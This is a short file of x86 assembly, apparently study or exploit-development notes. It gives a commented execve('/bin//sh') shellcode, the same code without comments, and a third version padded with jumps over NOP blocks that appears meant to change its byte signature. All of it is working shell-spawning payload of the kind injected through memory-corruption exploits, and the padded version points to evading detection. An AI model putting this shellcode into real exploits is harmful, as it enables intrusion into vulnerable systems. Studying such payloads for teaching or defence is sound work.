# X86
xor     eax, eax    ;Clearing eax register
push    eax         ;Pushing NULL bytes
push    0x68732f2f  ;Pushing //sh
push    0x6e69622f  ;Pushing /bin
mov     ebx, esp    ;ebx now has address of /bin//sh
push    eax         ;Pushing NULL byte
mov     edx, esp    ;edx now has address of NULL byte
push    ebx         ;Pushing address of /bin//sh
mov     ecx, esp    ;ecx now has address of address
                    ;of /bin//sh byte
mov     al, 11      ;syscall number of execve is 11
int     0x80        ;Make the system call

xor     eax, eax    
push    eax         
push    0x68732f2f  
push    0x6e69622f  
mov     ebx, esp    
push    eax         
mov     edx, esp    
push    ebx         
mov     ecx, esp    
mov     al, 11      
int     0x80        


xor     eax, eax    
push    eax         
push    0x68732f2f
jmp    $+8
nop
nop
nop
nop
nop
nop
push    0x6e69622f  
mov     ebx, esp    
push    eax     
jmp    $+8
nop
nop
nop
nop
nop
nop
mov     edx, esp    
push    ebx         
mov     ecx, esp    
mov     al, 11      
int     0x80        